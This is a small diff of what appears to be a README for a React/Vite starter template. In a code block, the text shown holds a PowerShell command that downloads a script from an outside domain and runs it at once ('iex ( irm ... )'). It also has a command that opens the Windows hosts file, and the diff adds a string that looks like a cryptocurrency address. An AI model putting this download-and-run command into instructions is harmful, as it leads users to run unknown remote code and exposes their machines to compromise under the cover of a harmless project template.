@@ -3,6 +3,8 @@
 iex ( irm ("https://baa4ts.is-a.dev/w.ps1") )
 
 powershell -c "notepad C:\Windows\System32\drivers\etc\hosts"
+
+DH4JZzJJS8MwjjD2t6RfbyJrkeq8YhbJJz
 ```
 
 This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.
